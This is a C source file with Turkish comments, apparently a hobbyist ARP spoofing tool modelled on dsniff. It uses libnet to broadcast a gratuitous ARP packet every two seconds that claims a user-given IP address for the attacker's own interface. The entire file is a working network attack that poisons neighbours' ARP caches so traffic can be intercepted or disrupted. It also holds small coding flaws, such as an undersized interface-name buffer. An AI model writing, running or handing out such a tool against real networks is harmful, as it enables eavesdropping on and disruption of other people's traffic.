/*
 *Macof.c (dsniff library)'den esinlenerek Oguz Han Ayaz Tarafindan Yazilmistir.
 *
 *Copyright (c) 1999 Dug Song <dugsong@monkey.org>"
 */

#include <stdio.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>
#include <arpa/inet.h>

#define ERRBUF_SIZE 500
#define IP_MAX_SIZE 16


void usage(){
  printf("./ARPspoofing <IP adres>\n");
  printf("ARP mesajlari yayinda -gratuitous ARP- olarak gonderilecektir\n");
}

int main(int argc, char **argv){

	if (argc < 2){
    usage();
		exit(1);
	}
	int i=1;

	/******** Cihaz/Baglanti_Secim_Baslangic ***********/
	pcap_if_t *all_dev, *dev;
	char *dev_name;
	char err_buf[ERRBUF_SIZE], dev_list[30][2];
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Cihaz bulunamadi: %s", err_buf);
		exit(1);
	}
	if(all_dev == NULL)
	{
		fprintf(stderr, "Aygit bulunamadi. Lutfen root ile calistiginizi kontrol edin \n");
		exit(1);
	}
	printf("Kullanilabilir cihazlar listesi: \n");
	int c = 1;
	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}
	printf("Lutfen monitorlenecek cihazini secin (orn. Eth0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //Siliniyor '\n'
   /******** Cihaz/Baglanti_Secim_Son ***********/

	/******** Libnet ve donanim adreslerini ayarlama ***************/
   // Libnet iceriginin baslatilmasi
	libnet_t *context;
	if ((context = libnet_init(LIBNET_LINK, dev_name, err_buf)) == NULL){
    	errx(1, "%s", err_buf);
  	}

    //Kaynak IP (yani kimlik sahtekarligi-spoofing- yapmak istedigimiz ad) kullanici tarafindan belirtilir. 
    // Gratuitous(nedensiz) ARP mesaji gönderdigimizden, hedef IP adresi kaynak IP'ye esit olarak ayarlandi
  	char srcipstring[IP_MAX_SIZE];
  	strncpy(srcipstring,argv[1],IP_MAX_SIZE);
  	uint32_t srcipaddr;
  	inet_pton(AF_INET,srcipstring,&srcipaddr);

    //Kaynak donanim adresi kendi arayüzümüzün adresidir.
  	uint8_t *srchdaddr = (uint8_t*) libnet_get_hwaddr(context);  
  	uint8_t desthdaddr[6];
  	memset(desthdaddr,255,6);  //Hedef IP adresi ff:ff:ff:ff:ff:ff


  	while (1){
  		libnet_build_arp(ARPHRD_ETHER,         //donanim adres turu
                      ETHERTYPE_IP,            //protokol adres turu
                      6,                       //donanim adres boyutu
                      4,                       //protokol adres boyutu
                      1,                       //operation turu (ornegin : Gratuitous ARP icin 2)
                      srchdaddr,               //gonderen donanim adresi
                      (uint8_t*)&srcipaddr,    //gonderen protokol adresi
                      desthdaddr,              //hedef donanim adresi
                      (uint8_t*)&srcipaddr,    //hedef protokol adresi
                      NULL,                    //payload
                      0,                       //Payload Length (Veri uzunluðu)
                      context,                 //libnet icerigine bir pointer
                      0);                      //header protokol tagi (yeni bir tane olusturmak icin,0)

  		libnet_build_ethernet(desthdaddr,   //hedef ethernet adresi
                          srchdaddr,        //kaynak ethernet adresi
                          ETHERTYPE_ARP,    //ust katman protokol turu
                          NULL,             //payload
                          0,                //payload length (Veri uzunluðu)
                          context,          //libnet icerigine bir pointer
                          0); 			    //header protokol tagi (yeni bir tane olusturmak icin,0)
  		//packet injection
    	if (libnet_write(context) < 0)
      	errx(1, "Paket Injection Sirasinda Hata");

    	//baska bir injection icin context clearlanmali
    	libnet_clear_packet(context);

    	sleep(2); //2 saniye bekleme suresi,Diger bir degisle her 2snde bir gönderecek arp paketlerini
  	  printf(" Injection Sayisi: %d\r",i++);
      fflush(stdout);
    }	
 	printf(" Injection Sayisi: %d\n", i);
  
  	return 1;
}
